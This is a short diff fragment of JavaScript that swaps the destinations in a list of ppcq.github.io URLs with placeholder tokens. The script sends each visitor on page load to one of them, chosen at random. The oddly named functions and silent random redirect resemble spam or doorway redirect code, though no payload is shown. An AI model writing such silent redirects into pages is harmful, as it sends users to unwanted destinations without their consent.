@@ -7,8 +7,8 @@ function leleua() {
 }
 
 var urls=[
-'https://ppcq.github.io/pp?{nnnnnnnnnnn}{wwwwww}',
-'https://ppcq.github.io/ll.html?{nnnnnnnnnnn}{wwwwww}',
+'https://ppcq.github.io/gg?{nnnnnnnnnnn}{wwwwww}',
+'https://ppcq.github.io/ff.html?{nnnnnnnnnnn}{wwwwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
